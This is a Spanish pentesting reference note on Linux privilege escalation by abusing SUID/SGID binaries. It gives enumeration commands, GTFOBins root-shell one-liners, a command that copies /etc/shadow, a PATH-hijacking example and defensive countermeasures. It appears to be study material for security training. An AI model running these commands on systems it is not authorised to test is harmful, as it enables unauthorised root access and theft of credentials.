# Explotación de Binarios SUID/SGID

## Descripción
Los bits SUID (Set User ID) y SGID (Set Group ID) son permisos especiales en sistemas Unix/Linux que permiten ejecutar un binario con los privilegios del propietario (SUID) o del grupo (SGID) del archivo, en lugar de los del usuario que lo ejecuta. Cuando un binario con SUID pertenece a root, cualquier usuario que lo ejecute obtiene temporalmente privilegios de root. Un atacante puede abusar de binarios SUID/SGID mal configurados o vulnerables para escalar privilegios, ejecutar comandos como root o leer/escribir archivos protegidos. Esta técnica es una de las más comunes en la escalada de privilegios en Linux.

## Clasificación
- **Fase**: Post-Explotación
- **MITRE ATT&CK**: T1548.001 (Abuse Elevation Control Mechanism: Setuid and Setgid)
- **Plataforma**: Linux
- **Dificultad**: Básica

## Herramientas
- **find** — búsqueda de binarios con bits SUID/SGID en el sistema de archivos
- **GTFOBins** (https://gtfobins.github.io/) — base de datos de binarios Unix que pueden ser abusados para escalar privilegios
- **linPEAS** (`linpeas.sh`) — script de enumeración automatizada que identifica binarios SUID/SGID entre otros vectores
- **strings** / **ltrace** / **strace** — análisis de binarios SUID personalizados para descubrir llamadas inseguras

## Comandos / Ejemplos

### Enumeración de binarios SUID
```bash
# Buscar todos los archivos con bit SUID activado
find / -perm -4000 -type f 2>/dev/null

# Buscar archivos con bit SGID activado
find / -perm -2000 -type f 2>/dev/null

# Buscar ambos (SUID o SGID)
find / -perm -u=s -o -perm -g=s -type f 2>/dev/null

# Comparar contra binarios SUID por defecto del sistema
find / -perm -4000 -type f 2>/dev/null | sort > suid_actual.txt
# Comparar con lista conocida para identificar binarios no estándar
```

### Explotación con GTFOBins
```bash
# Ejemplo: si /usr/bin/find tiene SUID
find . -exec /bin/sh -p \; -quit

# Ejemplo: si /usr/bin/vim tiene SUID
vim -c ':!/bin/sh'

# Ejemplo: si /usr/bin/python3 tiene SUID
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# Ejemplo: si /usr/bin/nmap tiene SUID (versiones antiguas con modo interactivo)
nmap --interactive
!sh

# Ejemplo: si /usr/bin/cp tiene SUID — copiar /etc/shadow
cp /etc/shadow /tmp/shadow_copy
```

### Análisis de binarios SUID personalizados
```bash
# Examinar strings del binario para descubrir comandos internos
strings /usr/local/bin/custom_suid_binary

# Trazar llamadas al sistema
strace /usr/local/bin/custom_suid_binary 2>&1 | grep exec

# Si el binario llama a un comando sin ruta absoluta (ej: "service")
# Se puede hacer PATH hijacking
export PATH=/tmp:$PATH
echo '#!/bin/bash' > /tmp/service
echo '/bin/bash -p' >> /tmp/service
chmod +x /tmp/service
/usr/local/bin/custom_suid_binary
```

## Contramedidas
- Auditar regularmente binarios con SUID/SGID: `find / -perm -4000 -type f` y eliminar el bit donde no sea necesario
- Aplicar el principio de mínimo privilegio: no asignar SUID a binarios que no lo requieran estrictamente
- Montar particiones de usuarios con la opción `nosuid` en `/etc/fstab` para prevenir la ejecución de binarios SUID
- Usar capabilities de Linux en lugar de SUID cuando se requieran permisos específicos granulares
- Implementar AppArmor o SELinux para restringir las acciones de binarios SUID
- Los binarios SUID personalizados deben usar rutas absolutas en todas las llamadas a comandos externos

## Referencias
- MITRE Corporation. (2024). ATT&CK Technique T1548.001: Abuse Elevation Control Mechanism: Setuid and Setgid. https://attack.mitre.org/techniques/T1548/001/
- GTFOBins. (s.f.). *GTFOBins* [Base de datos]. https://gtfobins.github.io/
- Kim, P. (2018). *The Hacker Playbook 3*. Secure Planet, LLC.
- OccupyTheWeb. (2018). *Linux Basics for Hackers*. No Starch Press.
- Notas del proyecto: notas-md/HNotes/HNotes/Hacking/Privilege Escalation.md
